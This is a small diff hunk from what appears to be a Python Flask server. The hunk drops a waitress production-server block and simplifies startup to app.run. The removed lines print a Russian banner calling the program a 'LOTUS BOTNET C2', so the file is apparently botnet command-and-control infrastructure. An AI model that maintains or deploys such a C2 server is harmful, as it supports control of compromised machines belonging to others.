@@ -431,10 +431,4 @@ def test():
 # ============================================================
 
 if __name__ == '__main__':
-    try:
-        from waitress import serve
-        print("🔥 LOTUS BOTNET C2 запущен на waitress (production)")
-        serve(app, host='0.0.0.0', port=5000, threads=8)
-    except ImportError:
-        print("⚠️ waitress не установлен, использую Flask development server")
-        app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False)
